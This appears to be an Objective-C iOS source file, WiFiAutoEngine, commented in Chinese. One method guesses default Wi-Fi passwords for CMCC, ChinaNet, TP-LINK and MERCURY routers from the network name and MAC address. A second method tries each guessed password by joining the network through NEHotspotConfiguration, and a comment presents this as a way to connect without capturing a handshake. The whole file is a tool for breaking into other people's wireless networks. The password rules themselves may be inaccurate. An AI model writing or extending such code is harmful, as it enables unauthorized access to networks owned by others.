#import "WiFiAutoEngine.h"
#import <NetworkExtension/NetworkExtension.h>

@implementation WiFiAutoEngine

// 模式 1: 运营商默认密码特征算法库 (CMCC / ChinaNet / TP-Link 等)
+ (NSString *)calculateDefaultKeyWithSSID:(NSString *)ssid bssid:(NSString *)bssid {
    if (!ssid || ssid.length == 0) return nil;

    NSString *cleanBSSID = [[bssid stringByReplacingOccurrencesOfString:@":" withString:@""] uppercaseString];

    // 1. 中国移动 CMCC 特征光猫算法推算
    if ([ssid hasPrefix:@"CMCC-"] || [ssid hasPrefix:@"and-baby"]) {
        if (cleanBSSID.length >= 8) {
            // 取 MAC 后 8 位作为默认初筛
            return [cleanBSSID substringFromIndex:cleanBSSID.length - 8].lowercaseString;
        }
    }

    // 2. 中国电信 ChinaNet 常见默认规律
    if ([ssid hasPrefix:@"ChinaNet-"] || [ssid hasPrefix:@"Mifi-"]) {
        if (cleanBSSID.length >= 6) {
            return [NSString stringWithFormat:@"cn%@", [cleanBSSID substringFromIndex:cleanBSSID.length - 6].lowercaseString];
        }
    }

    // 3. TP-LINK 经典出厂命名 (如 TP-LINK_3F07) 常见为 MAC 后缀或空密
    if ([ssid hasPrefix:@"TP-LINK_"] || [ssid hasPrefix:@"MERCURY_"]) {
        NSArray *parts = [ssid componentsSeparatedByString:@"_"];
        if (parts.count > 1) {
            NSString *suffix = parts[1];
            if (suffix.length >= 4) {
                // 部分老旧批次默认 pin 规则
                return [NSString stringWithFormat:@"1234%@", suffix];
            }
        }
    }

    return nil; // 无匹配特征
}

// 模式 2: 底层直连测试模块 (无需 CAP 抓包，直接测通)
+ (void)tryConnectSSID:(NSString *)ssid password:(NSString *)password completion:(void(^)(BOOL success, NSError *error))completion {
    if (@available(iOS 11.0, *)) {
        NEHotspotConfiguration *config = [[NEHotspotConfiguration alloc] initWithSSID:ssid passphrase:password isWEP:NO];
        config.joinOnce = YES; // 测试连接后不长期保存冗余配置

        [[NEHotspotConfigurationManager sharedManager] applyConfiguration:config completionHandler:^(NSError * _Nullable error) {
            if (!error) {
                if (completion) completion(YES, nil);
            } else {
                if (completion) completion(NO, error);
            }
        }];
    } else {
        if (completion) completion(NO, [NSError errorWithDomain:@"WiFiTool" code:-1 userInfo:@{NSLocalizedDescriptionKey: @"系统版本过低"}]);
    }
}

@end
